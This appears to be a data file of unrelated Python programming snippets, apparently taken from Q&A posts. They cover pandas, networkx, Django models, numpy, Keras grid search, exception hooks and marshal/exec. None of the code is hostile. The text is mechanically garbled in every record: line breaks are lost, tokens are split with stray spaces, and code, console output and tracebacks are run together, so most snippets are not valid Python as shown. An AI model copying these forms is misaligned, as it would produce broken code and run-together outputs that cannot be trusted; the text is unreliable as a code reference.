"CALENDAR_DATE ORDER_NUMBER INVOICE_NUMBER TRANSACTION_TYPE CUSTOMER_NUMBER CUSTOMER_NAME5/13/2016 0:00 13867666 6892372 S 2026 CUSTOMER 1 df = p.read_table ( `` E : /FileLoc/ThisIsAFile.txt '' , encoding = `` iso-8859-1 '' ) CALENDAR_DATE ORDER_NUMBER INVOICE_NUMBER5/13/2016 0:00 13867666 6892372 S 2026 CUSTOMER 1"
"import networkx as nxG = nx.Graph ( ) G.add_edges_from ( [ ( ' A ' , ' B ' ) , ( ' A ' , ' C ' ) , ( 'D ' , ' B ' ) , ( ' E ' , ' C ' ) , ( ' E ' , ' F ' ) , ( ' B ' , ' H ' ) , ( ' B ' , ' G ' ) , ( ' B ' , ' F ' ) , ( ' C ' , ' G ' ) ] ) from itertools import combinations # print ( len ( list ( combinations ( G.nodes , 3 ) ) ) ) triad_class = { } for nodes in combinations ( G.nodes , 3 ) : n_edges = G.subgraph ( nodes ) .number_of_edges ( ) triad_class.setdefault ( n_edges , [ ] ) .append ( nodes ) print ( triad_class ) { 3 : [ ( ' A ' , ' B ' , ' C ' ) ] , 2 : [ ( ' A ' , ' B ' , 'D ' ) , ( ' B ' , ' C ' , 'D ' ) , ( ' B ' , 'D ' , ' E ' ) ] , 1 : [ ( ' A ' , ' B ' , ' E ' ) , ( ' A ' , ' B ' , ' F ' ) , ( ' A ' , ' B ' , ' G ' ) , ( ' A ' , ' C ' , 'D ' ) , ( ' A ' , ' C ' , ' E ' ) , ( ' A ' , ' C ' , ' F ' ) , ( ' A ' , ' C ' , ' G ' ) , ( ' A ' , 'D ' , ' E ' ) , ( ' A ' , ' F ' , ' G ' ) , ( ' B ' , ' C ' , ' E ' ) , ( ' B ' , ' C ' , ' F ' ) , ( ' B ' , ' C ' , ' G ' ) , ( ' B ' , 'D ' , ' F ' ) , ( ' B ' , 'D ' , ' G ' ) , ( ' B ' , ' F ' , ' G ' ) , ( ' C ' , 'D ' , ' E ' ) , ( ' C ' , ' F ' , ' G ' ) , ( 'D ' , ' E ' , ' F ' ) , ( 'D ' , ' E ' , ' G ' ) , ( 'D ' , ' F ' , ' G ' ) , ( ' E ' , ' F ' , ' G ' ) ] , 0 : [ ( ' A ' , 'D ' , ' F ' ) , ( ' A ' , 'D ' , ' G ' ) , ( ' A ' , ' E ' , ' F ' ) , ( ' A ' , ' E ' , ' G ' ) , ( ' B ' , ' E ' , ' F ' ) , ( ' B ' , ' E ' , ' G ' ) , ( ' C ' , 'D ' , ' F ' ) , ( ' C ' , 'D ' , ' G ' ) , ( ' C ' , ' E ' , ' F ' ) , ( ' C ' , ' E ' , ' G ' ) ] }"
"op.bulk_insert ( permission , [ { 'name ' : 'ViewContent ' , 'contexts ' : [ pgpermissioncontexts.resourceType ] } ] ) op.bulk_insert ( permission , [ { 'name ' : 'ViewContent ' , 'contexts ' : [ PermissionContexts.resourceType ] } ] ) op.bulk_insert ( permission , [ { 'name ' : 'ViewContent ' , 'contexts ' : sa.cast ( [ PermissionContexts.resourceType ] , sa.ARRAY ( pgenum ) ) } ] ) op.bulk_insert ( permission , [ { 'name ' : 'ViewContent ' , 'contexts ' : [ ] } ] )"
"class Vehicle ( SoftDeleteModel ) : routes = models.ManyToManyField ( 'RouteBoundary ' , through='VehicleBoundaryMap ' , verbose_name=_ ( 'routes ' ) , limit_choices_to= { 'active ' : True } ) class VehicleBoundaryMap ( SoftDeleteModel ) : vehicle = models.ForeignKey ( Vehicle , verbose_name= '' vehicle '' ) route_boundary = models.ForeignKey ( RouteBoundary , verbose_name= '' route boundary '' ) # ... more stuff here alive = SoftDeleteManager ( ) class SoftDeleteManager ( models.Manager ) : use_for_related_fields = True def get_queryset ( self ) : return SoftDeleteQuerySet ( self.model ) .filter ( active=True )"
"> > > print row # the row object prints like a tuple ( u'string ' , ) > > > print str ( row ) # why would n't this match the output from above ? < sqlite3.Row object at 0xa19a450 > > > > row # usually this would be the repr for an object ( u'string ' , ) > > > print repr ( row ) # but repr ( row ) is something different as well ! < sqlite3.Row object at 0xa19a450 >"
ids = [ obj.id for obj in objs if obj.id > 100 ]
"import argparsedef foo ( ) : return 'foo'def bar ( ) : return 'bar'parser = argparse.ArgumentParser ( ) functions = { f.__name__ : f for f in [ foo , bar ] } parser.add_argument ( `` function '' , type=lambda f : functions.get ( f ) , help= '' which function '' , choices=functions ) args = parser.parse_args ( ) print ( args.function ( ) ) $ python blah.py foousage : blah.py [ -h ] { foo , bar } blah.py : error : argument function : invalid choice : < function foo at 0x7f65746dd848 > ( choose from 'foo ' , 'bar ' )"
"f ( x , y ) = 2x.+y"
"# ! /bin/bash # Run some PyUnit testspython2 test.pypython3 test.py import sys # Backport Python 3 's range to Python 2 so that this program will run # identically in both versions.if sys.version_info < ( 3 , 0 ) : range = xrange for i in range ( 1000000000 ) : do_something_with ( i )"
"def foo ( ) : print `` Inside foo ( ) ... '' def main ( ) : print `` This is a simple script that should count to 3 . '' for i in range ( 1 , 4 ) : print `` This is iteration number '' , i foo ( ) if __name__ == `` __main__ '' : main ( ) with open ( 'simple.py ' , ' r ' ) as f : code = f.read ( ) exec code This is a simple script that should count to 3.This is iteration number 1This is iteration number 2This is iteration number 3Inside foo ( ) ... import marshaldef runme ( file ) : with open ( file , `` r '' ) as f : code = marshal.load ( f ) exec codewith open ( `` simple.py '' , `` r '' ) as f : contents = f.read ( ) code = compile ( contents , `` simple.py '' , `` exec '' ) with open ( `` marshalled '' , `` w '' ) as f : marshal.dump ( code , f ) runme ( `` marshalled '' ) This is a simple script that should count to 3.This is iteration number 1This is iteration number 2This is iteration number 3Traceback ( most recent call last ) : File `` ./exec_within_function.py '' , line 17 , in < module > runme ( `` marshalled '' ) File `` ./exec_within_function.py '' , line 8 , in runme exec code File `` simple.py '' , line 15 , in < module > main ( ) File `` simple.py '' , line 12 , in main foo ( ) NameError : global name 'foo ' is not defined import simple # imports simple.pydir ( simple ) [ '__builtins__ ' , '__doc__ ' , '__file__ ' , '__name__ ' , '__package__ ' , 'foo ' , 'main ' ] import dis , sysimport simpledis.dis ( sys.modules [ `` simple '' ] )"
firefox http : //somewebsite processStuff.py file/url processStuff.py anotherfile
"Python 2.7.5 ( default , Mar 9 2014 , 22:15:05 ) [ GCC 4.2.1 Compatible Apple LLVM 5.0 ( clang-500.0.68 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > from datetime import datetime > > > date = datetime.strptime ( '2013-08-15 10:23:05 PDT ' , ' % Y- % m- % d % H : % M : % S % Z ' ) > > > print ( date ) 2013-08-15 10:23:05 Python 2.7.6 ( default , Mar 22 2014 , 22:59:56 ) [ GCC 4.8.2 ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > from datetime import datetime > > > date = datetime.strptime ( '2013-08-15 10:23:05 PDT ' , ' % Y- % m- % d % H : % M : % S % Z ' ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/lib/python2.7/_strptime.py '' , line 325 , in _strptime ( data_string , format ) ) ValueError : time data '2013-08-15 10:23:05 PDT ' does not match format ' % Y- % m- % d % H : % M : % S % Z ' > > > date = datetime.strptime ( '2013-08-15 10:23:05 -0700 ' , ' % Y- % m- % d % H : % M : % S % z ' ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/_strptime.py '' , line 317 , in _strptime ( bad_directive , format ) ) ValueError : ' z ' is a bad directive in format ' % Y- % m- % d % H : % M : % S % z '"
"X = xor_input = np.array ( [ [ 0,0 ] , [ 0,1 ] , [ 1,0 ] , [ 1,1 ] ] ) Y = xor_output = np.array ( [ [ 0,1,1,0 ] ] ) .T from itertools import chainimport matplotlib.pyplot as pltimport numpy as npnp.random.seed ( 0 ) def sigmoid ( x ) : # Returns values that sums to one . return 1 / ( 1 + np.exp ( -x ) ) def sigmoid_derivative ( sx ) : # See https : //math.stackexchange.com/a/1225116 return sx * ( 1 - sx ) # Cost functions.def mse ( predicted , truth ) : return 0.5 * np.mean ( np.square ( predicted - truth ) ) def mse_derivative ( predicted , truth ) : return predicted - truthX = xor_input = np.array ( [ [ 0,0 ] , [ 0,1 ] , [ 1,0 ] , [ 1,1 ] ] ) Y = xor_output = np.array ( [ [ 0,1,1,0 ] ] ) .T # Define the shape of the weight vector.num_data , input_dim = X.shape # Lets set the dimensions for the intermediate layer.hidden_dim = 5 # Initialize weights between the input layers and the hidden layer.W1 = np.random.random ( ( input_dim , hidden_dim ) ) # Define the shape of the output vector . output_dim = len ( Y.T ) # Initialize weights between the hidden layers and the output layer.W2 = np.random.random ( ( hidden_dim , output_dim ) ) # Initialize weighnum_epochs = 5000learning_rate = 0.3losses = [ ] for epoch_n in range ( num_epochs ) : layer0 = X # Forward propagation . # Inside the perceptron , Step 2. layer1 = sigmoid ( np.dot ( layer0 , W1 ) ) layer2 = sigmoid ( np.dot ( layer1 , W2 ) ) # Back propagation ( Y - > layer2 ) # How much did we miss in the predictions ? cost_error = mse ( layer2 , Y ) cost_delta = mse_derivative ( layer2 , Y ) # print ( layer2_error ) # In what direction is the target value ? # Were we really close ? If so , do n't change too much . layer2_error = np.dot ( cost_delta , cost_error ) layer2_delta = cost_delta * sigmoid_derivative ( layer2 ) # Back propagation ( layer2 - > layer1 ) # How much did each layer1 value contribute to the layer2 error ( according to the weights ) ? layer1_error = np.dot ( layer2_delta , W2.T ) layer1_delta = layer1_error * sigmoid_derivative ( layer1 ) # update weights W2 += - learning_rate * np.dot ( layer1.T , layer2_delta ) W1 += - learning_rate * np.dot ( layer0.T , layer1_delta ) # print ( np.dot ( layer0.T , layer1_delta ) ) # print ( epoch_n , list ( ( layer2 ) ) ) # Log the loss value as we proceed through the epochs . losses.append ( layer2_error.mean ( ) ) # print ( cost_delta ) # Visualize the lossesplt.plot ( losses ) plt.show ( ) from tqdm import tqdmimport numpy as npimport torchfrom torch import nnfrom torch import tensorfrom torch import optimimport matplotlib.pyplot as plttorch.manual_seed ( 0 ) device = 'gpu ' if torch.cuda.is_available ( ) else 'cpu ' # XOR gate inputs and outputs.X = xor_input = tensor ( [ [ 0,0 ] , [ 0,1 ] , [ 1,0 ] , [ 1,1 ] ] ) .float ( ) .to ( device ) Y = xor_output = tensor ( [ [ 0 ] , [ 1 ] , [ 1 ] , [ 0 ] ] ) .float ( ) .to ( device ) # Use tensor.shape to get the shape of the matrix/tensor.num_data , input_dim = X.shapeprint ( 'Inputs Dim : ' , input_dim ) # i.e . n=2 num_data , output_dim = Y.shapeprint ( 'Output Dim : ' , output_dim ) print ( 'No . of Data : ' , num_data ) # i.e . n=4 # Step 1 : Initialization . # Initialize the model. # Set the hidden dimension size.hidden_dim = 5 # Use Sequential to define a simple feed-forward network.model = nn.Sequential ( # Use nn.Linear to get our simple perceptron . nn.Linear ( input_dim , hidden_dim ) , # Use nn.Sigmoid to get our sigmoid non-linearity . nn.Sigmoid ( ) , # Second layer neurons . nn.Linear ( hidden_dim , output_dim ) , nn.Sigmoid ( ) ) model # Initialize the optimizerlearning_rate = 0.3optimizer = optim.SGD ( model.parameters ( ) , lr=learning_rate ) # Initialize the loss function.criterion = nn.MSELoss ( ) # Initialize the stopping criteria # For simplicity , just stop training after certain no . of epochs.num_epochs = 5000 losses = [ ] # Keeps track of the loses. # Step 2-4 of training routine.for _e in tqdm ( range ( num_epochs ) ) : # Reset the gradient after every epoch . optimizer.zero_grad ( ) # Step 2 : Foward Propagation predictions = model ( X ) # Step 3 : Back Propagation # Calculate the cost between the predictions and the truth . loss = criterion ( predictions , Y ) # Remember to back propagate the loss you 've computed above . loss.backward ( ) # Step 4 : Optimizer take a step and update the weights . optimizer.step ( ) # Log the loss value as we proceed through the epochs . losses.append ( loss.data.item ( ) ) plt.plot ( losses )"
"s=p=1 ; exec '' if s % p*s % ~-~p : print ` p ` + ' , '+ ` p+2 ` \ns*=p*p ; p+=2\n '' *999"
def deleteFile ( deleteFile ) : if os.path.isfile ( deleteFile ) : os.remove ( deleteFile ) os.path.isfile ( 'Testpipe ' )
import matplotlibprint matplotlib.pyplot # just checking import matplotlib.pyplot import numpyprint numpy.random
"1 21 31 42 32 42 5 with open ( ' C : /working_file.txt ' , mode= ' r ' , encoding = 'utf8 ' ) as f : for i , line in enumerate ( f ) : line_a = i lower_bound = i + 1 upper_bound = i + 4 with open ( ' C : /working_file.txt ' , mode= ' r ' , encoding = 'utf8 ' ) as g : for j , line in enumerate ( g ) : while j > = lower_bound and j < = upper_bound : line_b = j j = j+1 print ( line_a , line_b ) 990 991990 992990 993990 994990 992990 993990 994990 993990 994990 994 from collections import dequefrom itertools import cyclelog = open ( ' C : /example.txt ' , mode= ' w ' , encoding = 'utf8 ' ) try : xrange except NameError : # python3 xrange = rangedef pack ( d ) : tup = tuple ( d ) return zip ( cycle ( tup [ 0:1 ] ) , tup [ 1 : ] ) def window ( seq , n=2 ) : it = iter ( seq ) d = deque ( ( next ( it , None ) for _ in range ( n ) ) , maxlen=n ) yield pack ( d ) for e in it : d.append ( e ) yield pack ( d ) for l in window ( open ( ' c : /working_file.txt ' , mode= ' r ' , encoding='utf8 ' ) ,100 ) : for a , b in l : print ( a.strip ( ) + '\t ' + b.strip ( ) , file=log )"
@ cached_propertydef related_model ( self ) : # Ca n't cache this property until all the models are loaded . apps.check_models_ready ( ) return self.remote_field.model
"from PIL import Image , ImageDraw , ImageFontfont= './fonts/BebasNeue-Regular.ttf'color = ( 255 , 244 , 41 ) text = 'S'img = Image.new ( 'RGB ' , ( 500 , 500 ) , color= ( 255 , 255 , 255 ) ) imgW , imgH = img.sizefnt = ImageFont.truetype ( font , 600 ) d = ImageDraw.Draw ( img ) w , h = d.textsize ( text , fnt ) nullH = ( imgH-h ) print ( imgH , h ) d.text ( ( ( imgW-w ) /2 , nullH ) , text , font=fnt , fill=color ) img.show ( )"
"positive negative neutral1 [ marvel , moral , bold , destiny ] [ ] [ view , should ] 2 [ beautiful ] [ complicated , need ] [ ] 3 [ celebrate ] [ crippling , addiction ] [ big ]"
"# df = pandas.read_excel ( 'test.xlsx ' , header= [ 0,1,2 ] ) df = pandas.DataFrame ( { ( 'Unnamed : 0_level_0 ' , 'Unnamed : 0_level_1 ' , ' a ' ) : { 1 : 'aX ' , 2 : 'aY ' } , ( 'Unnamed : 1_level_0 ' , 'Unnamed : 1_level_1 ' , ' b ' ) : { 1 : 'bX ' , 2 : 'bY ' } , ( 'Unnamed : 2_level_0 ' , 'Unnamed : 2_level_1 ' , ' c ' ) : { 1 : 'cX ' , 2 : 'cY ' } , ( 'level1_1 ' , 'level2_1 ' , 'level3_1 ' ) : { 1 : 1 , 2 : 10 } , ( 'level1_1 ' , 'level2_1 ' , 'level3_2 ' ) : { 1 : 2 , 2 : 20 } , ( 'level1_1 ' , 'level2_2 ' , 'level3_1 ' ) : { 1 : 3 , 2 : 30 } , ( 'level1_1 ' , 'level2_2 ' , 'level3_2 ' ) : { 1 : 4 , 2 : 40 } , ( 'level1_2 ' , 'level2_1 ' , 'level3_1 ' ) : { 1 : 5 , 2 : 50 } , ( 'level1_2 ' , 'level2_1 ' , 'level3_2 ' ) : { 1 : 6 , 2 : 60 } , ( 'level1_2 ' , 'level2_2 ' , 'level3_1 ' ) : { 1 : 7 , 2 : 70 } , ( 'level1_2 ' , 'level2_2 ' , 'level3_2 ' ) : { 1 : 8 , 2 : 80 } } )"
"Path ( __file__ ) .parent print ( 'Parent : ' , Path ( __file__ ) .parent ) # output/home/user/EC/main-folder dotenv_path = os.path.join ( Path ( __file__ ) .parent , `` .env '' ) dotenv_path = pathlib_alternate_for_join ( Path ( __file__ ) .parent , `` .env '' )"
"def getSum ( self , a , b ) : while ( a & b ) : x = a & b y = a ^ b a = x < < 1 b = y return a ^ b"
"from time import sleepdef runTest ( a ) : sleep ( 1 ) assert a > = 0def test_all ( ) : for i in range ( 5 ) : yield ( runTest , i )"
"# app.pyimport loggingimport syslogger = logging.getLogger ( __name__ ) def excepthook ( exc_type , exc_value , traceback ) : exc_info = exc_type , exc_value , traceback if not issubclass ( exc_type , ( KeyboardInterrupt , SystemExit ) ) : logger.error ( 'Unhandled exception ' , exc_info=exc_info ) sys.__excepthook__ ( *exc_info ) sys.excepthook = excepthookdef potato ( ) : logger.warning ( 'about to die ... ' ) errorerrorerrorif __name__ == '__main__ ' : potato ( ) # test_app.pyimport appimport pytestimport sysfrom logging import WARNING , ERRORdef test_potato_raises ( ) : with pytest.raises ( NameError ) : app.potato ( ) def test_excepthook_is_set ( ) : assert sys.excepthook is app.excepthook # for caplog plugin : pip install pytest-catchlogdef test_excepthook_logs ( caplog ) : try : whatever except NameError as err : exc_info = type ( err ) , err , err.__traceback__ app.excepthook ( *exc_info ) assert caplog.record_tuples == [ ( 'app ' , ERROR , 'Unhandled exception ' ) ] [ record ] = caplog.records assert record.exc_info == exc_info def test_unhandled_exceptions_logged ( caplog ) : try : app.potato ( ) finally : assert caplog.record_tuples == [ ( 'app ' , WARNING , 'about to die ... ' ) , ( 'app ' , ERROR , 'Unhandled exception ' ) , ] return # return eats exception"
"> > > a = np.arange ( 1,8 ) .reshape ( ( 1 , -1 ) ) > > > aarray ( [ [ 1 , 2 , 3 , 4 , 5 , 6 , 7 ] ] ) 1 , 2 , 3 , 4 , 5 , 6 , 7 , 81+2 , 2+3 , ... 1+2+3 2+3+4 ... 1+2+3+4 2+3+4+5 ... 1 , 2 , 3 , 4 , 5 , 0 , 0 , 03 , 5 , 7 , 9 , 11,0 , 0 , 06 , 9 , 12,15,18,0 , 0 , 010,14,18,21,26,0 , 0 , 0 a [ :4 ] .cumsum ( ) .reshape ( ( -1,1 ) ) ; a [ 1:5 ] .cumsum ( ) .reshape ( ( -1,1 ) ) ..."
"CREATE TABLE public.campaign ( id integer NOT NULL , product product [ ] ) PRODUCT = ( ( 'car ' , 'car ' ) , ( 'truck ' , 'truck ' ) ) class Campaign ( models.Model ) : product = ArrayField ( models.CharField ( null=True , choices=PRODUCT ) ) campaign = Campaign ( id=5 , product= [ `` car '' , `` truck '' ] ) campaign.save ( ) ProgrammingError : column `` product '' is of type product [ ] but expression is of type text [ ] LINE 1 : ... '' product '' = ARRAY [ 'car ... class PRODUCT ( Enum ) : CAR = 'car ' TRUCK = 'truck'class Campaign ( models.Model ) : product = ArrayField ( EnumField ( PRODUCT , max_length=10 ) ) campaign = Campaign ( id=5 , product= [ CAR , TRUCK ] ) campaign.save ( ) INSERT INTO campaign ( `` product '' ) VALUES ( ' { car , truck } ' : :product [ ] )"
"from scipy.fftpack import fft # get a 500ms slice from dataframesample500ms = df.loc [ pd.to_datetime ( '2019-12-15 11:01:31.000 ' ) : pd.to_datetime ( '2019-12-15 11:01:31.495 ' ) ] [ 'XYZ_Acc ' ] f_s = 200 # sensor sampling frequency 200 HzT = 0.005 # 5 milliseconds between successive observation T =1/f_sN = 100 # 100 samples in 0.5 secondsf_values = np.linspace ( 0.0 , f_s/2 , N//2 ) fft_values = fft ( sample500ms ) fft_mag_values = 2.0/N * np.abs ( fft_values [ 0 : N//2 ] ) fig_fft = plt.figure ( figsize= ( 5,5 ) ) ax = fig_fft.add_axes ( [ 0,0,1,1 ] ) ax.plot ( f_values , fft_mag_values ) X , Y , Z , Latitude , Longitude , Speed , timestamp0.8756 , -1.3741,3.4166,35.894833,14.354166,11.38,2019-12-15 11:01:30:7501.0317 , -0.2728,1.5602,35.894833,14.354166,11.38,2019-12-15 11:01:30:7551.0317 , -0.2728,1.5602,35.894833,14.354166,11.38,2019-12-15 11:01:30:7601.0317 , -0.2728,1.5602,35.894833,14.354166,11.38,2019-12-15 11:01:30:765-0.1669 , -1.9912 , -4.2043,35.894833,14.354166,11.38,2019-12-15 11:01:30:770-0.1669 , -1.9912 , -4.2043,35.894833,14.354166,11.38,2019-12-15 11:01:30:775-0.1669 , -1.9912 , -4.2043,35.894833,14.354166,11.38,2019-12-15 11:01:30:780 df [ 'XYZ_Acc_Mag ' ] = ( abs ( df [ ' X ' ] ) + abs ( df [ ' Y ' ] ) + abs ( df [ ' Z ' ] ) ) df [ 'XYZ_Acc ' ] = ( df [ ' X ' ] + df [ ' Y ' ] + df [ ' Z ' ] )"
"from setuptools import setup , find_packagespackages = find_packages ( )"
"[ traceback skipped ] unable to load app 0 ( mountpoint= '' ) ( callable not found or import error ) *** no app loaded . going in full dynamic mode ****** uWSGI is running in multiple interpreter mode ***spawned uWSGI master process ( pid : 17923 ) spawned uWSGI worker 1 ( pid : 17948 , cores : 1 ) ..."
"pos_data = [ ] # Some typical valuesd = 2 # Could also be 3vol_ext = ( 1000 , 500 ) # If d = 3 , this will have another entryratio = [ 5.0 , 8.0 ] # Again , if d = 3 , it will have another entryfor i in range ( d ) : pos_data.append ( np.zeros ( vol_ext ) ) if d == 2 : for y in range ( vol_ext [ 1 ] ) : for x in range ( vol_ext [ 0 ] ) : pos_data [ 0 ] [ x , y ] = ( x - 1.0 ) * ratio [ 0 ] pos_data [ 1 ] [ x , y ] = ( y - 1.0 ) * ratio [ 1 ] elif d == 3 : for z in range ( vol_ext [ 2 ] ) : for y in range ( vol_ext [ 1 ] ) : for x in range ( vol_ext [ 0 ] ) : pos_data [ 0 ] [ x , y , z ] = ( x - 1.0 ) * ratio [ 0 ] pos_data [ 1 ] [ x , y , z ] = ( y - 1.0 ) * ratio [ 1 ] pos_data [ 2 ] [ x , y , z ] = ( z - 1.0 ) * ratio [ 2 ]"
class A : def m1 ( self ) : pass def m2 ( self ) : passa = A ( ) a . < -- - suggest here 'm1 ' and 'm2'fun1 ( a ) def fun1 ( b ) : b . < -- - suggest here 'm1 ' and 'm2 '
"Traceback ( most recent call last ) : File `` keras_cnn_phoneme_generator_fit.py '' , line 229 , in < module > grid_results=grid.fit ( train_input , train_output ) File `` /home/c/.local/lib/python2.7/site-packages/sklearn/model_selection/_search.py '' , line 940 , in fit return self._fit ( X , y , groups , ParameterGrid ( self.param_grid ) ) File `` /home/c/.local/lib/python2.7/site-packages/sklearn/model_selection/_search.py '' , line 541 , in _fit X , y , groups = indexable ( X , y , groups ) File `` /home/c/.local/lib/python2.7/site-packages/sklearn/utils/validation.py '' , line 206 , in indexable check_consistent_length ( *result ) File `` /home/c/.local/lib/python2.7/site-packages/sklearn/utils/validation.py '' , line 181 , in check_consistent_length `` samples : % r '' % [ int ( l ) for l in lengths ] ) ValueError : Found input variables with inconsistent numbers of samples : [ 33 , 1 ] def model3 ( kernel_number = 200 , kernel_shape = ( window_height,3 ) ) : # stride = 1 # dim = 40 # window_height = 8 # splits = ( ( 40-8 ) +1 ) /1 = 33 # next ( test_generator ( ) ) # next ( train_generator ( batch_size ) ) # kernel_number = 200 list_of_input = [ Input ( shape = ( window_height , total_frames_with_deltas,3 ) ) for i in range ( splits ) ] list_of_conv_output = [ ] list_of_max_out = [ ] for i in range ( splits ) : if splits == 1 : list_of_conv_output.append ( Conv2D ( filters = kernel_number , kernel_size = kernel_shape , activation = 'relu ' ) ( list_of_input [ i ] ) ) list_of_max_out.append ( ( MaxPooling2D ( pool_size= ( ( 1,11 ) ) ) ( list_of_conv_output [ i ] ) ) ) else : list_of_conv_output.append ( Conv2D ( filters = 200 , kernel_size = ( window_height,3 ) , activation = 'relu ' ) ( list_of_input [ i ] ) ) list_of_max_out.append ( ( MaxPooling2D ( pool_size= ( ( 1,11 ) ) ) ( list_of_conv_output [ i ] ) ) ) merge = keras.layers.concatenate ( list_of_max_out ) print merge.shape reshape = Reshape ( ( total_frames/total_frames , -1 ) ) ( merge ) dense1 = Dense ( units = 1000 , activation = 'relu ' , name = `` dense_1 '' ) ( reshape ) dense2 = Dense ( units = 1000 , activation = 'relu ' , name = `` dense_2 '' ) ( dense1 ) dense3 = Dense ( units = 145 , activation = 'softmax ' , name = `` dense_3 '' ) ( dense2 ) model = Model ( inputs = list_of_input , outputs = dense3 ) model.compile ( loss= '' categorical_crossentropy '' , optimizer= '' SGD '' , metrics = [ metrics.categorical_accuracy ] ) reduce_lr=ReduceLROnPlateau ( monitor='val_loss ' , factor=0.1 , patience=3 , verbose=1 , mode='auto ' , epsilon=0.001 , cooldown=0 ) stop = EarlyStopping ( monitor='val_loss ' , min_delta=0 , patience=5 , verbose=1 , mode='auto ' ) log=csv_logger = CSVLogger ( '/home/c/kaldi-trunk/dnn/training_'+str ( total_frames ) + '' _ '' +str ( dim ) + '' _ '' +str ( window_height ) + '' _ '' +str ( batch_size ) + '' .csv '' ) checkpoint = ModelCheckpoint ( filepath= '' /media/c/E2302E68302E443F/Timit-dataset/timit/fbank/nn/ '' +str ( total_frames ) + '' _ '' +str ( dim ) + '' _ '' +str ( window_height ) + '' _ '' +str ( batch_size ) + '' .hdf5 '' , save_best_only=True ) if len ( sys.argv ) == 7 : model.load_weigts ( weights ) print model.summary ( ) # raw_input ( `` okay ? '' ) # hist_current = model.fit_generator ( train_generator ( batch_size ) , # steps_per_epoch=10 , # epochs = 100000 , # verbose = 1 , # validation_data = test_generator ( ) , # validation_steps=1 , # pickle_safe = True , # workers = 4 , # callbacks = [ log , checkpoint ] ) return model # model3 ( ) model = KerasClassifier ( build_fn=model3 , epochs = 10 , batch_size = 1 , verbose=1 ) kernel_number = [ 10,50,100,150,200,250 ] kernel_shape = [ ( window_height,3 ) , ( window_height,5 ) , ( window_height,8 ) ] param_grid = dict ( kernel_number = kernel_number , kernel_shape=kernel_shape ) grid = GridSearchCV ( estimator=model , param_grid=param_grid ) train_input , train_output = next ( train_generator ( 1 ) ) grid_results=grid.fit ( train_input , train_output ) print ( `` Best : % f using % s '' % ( grid_result.best_score_ , grid_result.best_params_ ) ) means = grid_result.cv_results_ [ 'mean_test_score ' ] stds = grid_result.cv_results_ [ 'std_test_score ' ] params = grid_result.cv_results_ [ 'params ' ] for mean , stdev , param in zip ( means , stds , params ) : print ( `` % f ( % f ) with : % r '' % ( mean , stdev , param ) ) print len ( train_input ) print train_input [ 0 ] .shapeprint train_output.shape33 ( 100 , 8 , 45 , 3 ) ( 100 , 1 , 145 )"
"import sysdef register_handler ( ) : orig_excepthook = sys.excepthook def error_catcher ( *exc_info ) : import logging log = logging.getLogger ( __name__ ) log.critical ( `` Unhandled exception '' , exc_info=exc_info ) orig_excepthook ( *exc_info ) sys.excepthook = error_catcher import logginglogging.basicConfig ( ) register_handler ( ) undefined ( ) # logs , then runs original excepthook"
"from pptx.util import Inchesfrom pptx import Presentationprs = Presentation ( 'dashboard.pptx ' ) left = Inches ( 0.5 ) top = Inches ( 1 ) slide = prs.slides.add_slide ( prs.slide_masters [ 0 ] .slide_layouts [ 2 ] ) pic = slide.shapes.add_picture ( 'test.png ' , left , top , width =None , height =None ) prs.save ( 'dashboard_new.pptx ' )"
"From To ValGE VD 1000GE VS 1600VS VD 1500VS GE 600VD GE 1200VD VS 1300 def myfun ( row ) : if `` GE '' not in ( row [ `` from '' ] , row [ `` to '' ] ) : row1=pd.DataFrame ( row ) .T row2=row1.copy ( ) row1 [ `` from '' ] = '' GE '' row2 [ `` to '' ] = '' GE '' return pd.concat ( [ row1 , row2 ] ) else : return pd.DataFrame ( row ) .T > > df.apply ( myfun , axis=1 ) Val from to0 Val from to1 Val from to2 Val from to3 Val from to4 Val from to5 Val from to > > myfun ( df.loc [ 5 ] ) Val from to5 13 GE VD5 13 VS GE"
"attributes = { } row1 = [ 'strength ' , 'intelligence ' , 'charisma ' ] row2 = [ 'stamina ' , 'willpower ' ] row3 = [ 'dexterity ' , 'wits ' , 'luck ' ] def assignRow ( row , p ) : # p is the number of points you have to assign to each row rowValues = { } for i in range ( 0 , len ( row ) -1 ) : val = randint ( 0 , p ) rowValues [ row [ i ] ] = val + 1 p -= val rowValues [ row [ -1 ] ] = p + 1 return attributes.update ( rowValues ) assignRow ( row1 , 7 ) assignRow ( row2 , 5 ) assignRow ( row3 , 3 ) def convert ( list ) : for i in range ( len ( list ) ) : if list [ i ] < = 4 : list [ i ] = list [ i ] if list [ i ] in ( 5 , 6 ) : list [ i ] -= 1 if list [ i ] in ( 7 , 8 ) : list [ i ] -= 2 if list [ i ] in ( 9 , 10 ) : list [ i ] = 6 if list [ i ] in ( 11 , 12 , 13 ) : list [ i ] = 7 else : list [ i ] = 8"
"import numpy as npimport numpy.ma as maa = np.random.random ( 100 ) + 1j*np.random.random ( 100 ) mask = np.ones_like ( a , dtype='bool ' ) mask [ 0:9 ] = Falsea = ma.masked_array ( a , mask ) phase = np.angle ( a )"
[ 2012-09-12 12:23:33 ] SOME_UNIQ_ID filesize [ 2012-09-12 12:24:00 ] SOME_UNIQ_ID
"from moviepy.editor import *from pygame import * # Window displayWIN_WIDTH = 640WIN_HEIGHT = 400HALF_WIDTH = int ( WIN_WIDTH / 2 ) HALF_HEIGHT = int ( WIN_HEIGHT / 2 ) DISPLAY = ( WIN_WIDTH , WIN_HEIGHT ) DEPTH = 32FLAGS = FULLSCREEN # display.set_mode ( DISPLAY , FLAGS , DEPTH ) # define screen valuesdisplay.set_caption ( `` I 'm Working ! `` ) Credits = 'Untitled.mp4'def playVid ( video ) : clip = VideoFileClip ( video ) clip.resize ( DISPLAY ) .preview ( ) returnplayVid ( Credits )"
"import pymongod1 = { ' p ' : 0.5 , 'theta ' : 100 , 'sigma ' : 20 } d2 = { 'theta ' : 100 , 'sigma ' : 20 , ' p ' : 0.5 } I get the following results : d1 == d2 // Returns Truecollectn.find ( { 'goods.H ' : d1 } ) .count ( ) // Returns 33collectn.find ( { 'goods.H ' : d2 } ) .count ( ) // Returns 2"
"def do_store ( *args , **kwargs ) : try : key = ( args , tuple ( sorted ( kwargs.items ( ) , key=lambda i : i [ 0 ] ) ) ) results = f._results key=lambda i : i [ 0 ]"
